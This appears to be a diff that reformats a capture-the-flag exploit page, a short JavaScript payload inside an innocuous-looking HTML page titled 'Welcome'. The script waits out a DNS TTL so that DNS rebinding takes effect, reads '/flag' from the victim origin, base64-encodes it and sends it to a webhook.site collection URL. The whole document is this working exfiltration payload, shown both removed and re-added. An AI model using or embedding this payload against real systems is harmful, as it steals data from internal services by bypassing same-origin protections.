@@ -1,10 +1,22 @@
-<script>
-const VALUE_GREATER_THAN_TTL = 121;
-setTimeout(() => {
-    fetch('/flag')
-    .then(response => response.text())
-    .then(data => {
-        fetch(`https://webhook.site/7d96ce9a-983f-4b34-9f60-53fed9e1b128/?q=${btoa(data)}`);
-    });
-}, VALUE_GREATER_THAN_TTL);
-</script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Welcome</title>
+</head>
+<body>
+    <h1>Hello!</h1>
+    <p>This is a normal page.</p>
+
+    <script>
+        const VALUE_GREATER_THAN_TTL = 121; // Wait so DNS rebinding switches
+        setTimeout(() => {
+            fetch('/flag')
+                .then(response => response.text())
+                .then(data => {
+                    fetch(`https://webhook.site/7d96ce9a-983f-4b34-9f60-53fed9e1b128/?q=${btoa(data)}`);
+                });
+        }, VALUE_GREATER_THAN_TTL);
+    </script>
+</body>
+</html>
